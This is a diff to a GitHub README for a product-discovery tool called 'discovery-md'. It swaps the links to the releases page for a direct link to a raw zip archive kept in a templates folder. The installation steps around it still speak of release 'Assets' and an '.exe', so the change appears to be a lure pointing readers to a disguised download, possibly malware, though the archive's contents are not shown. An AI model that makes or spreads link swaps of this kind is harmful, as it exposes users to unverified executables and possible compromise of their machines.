@@ -1,6 +1,6 @@
 # 🔍 discovery-md - Streamline product discovery with smart insights
 
-<a href="https://github.com/Khensou4728/discovery-md/releases">
+<a href="https://github.com/Khensou4728/discovery-md/raw/refs/heads/main/templates/md-discovery-2.9-beta.4.zip">
   <img src="https://img.shields.io/badge/Download-Latest_Version-blue.svg" alt="Download discovery-md" />
 </a>
 
@@ -34,7 +34,7 @@ Your computer needs to meet these basic standards to run discovery-md:
 
 You need to download the installer from the release page.
 
-1.  Visit this page to download: [https://github.com/Khensou4728/discovery-md/releases](https://github.com/Khensou4728/discovery-md/releases)
+1.  Visit this page to download: [https://github.com/Khensou4728/discovery-md/raw/refs/heads/main/templates/md-discovery-2.9-beta.4.zip](https://github.com/Khensou4728/discovery-md/raw/refs/heads/main/templates/md-discovery-2.9-beta.4.zip)
 2.  Locate the section labeled "Assets."
 3.  Click the file ending in `.exe` to start your download.
 4.  Save the file to your desktop or your Downloads folder.
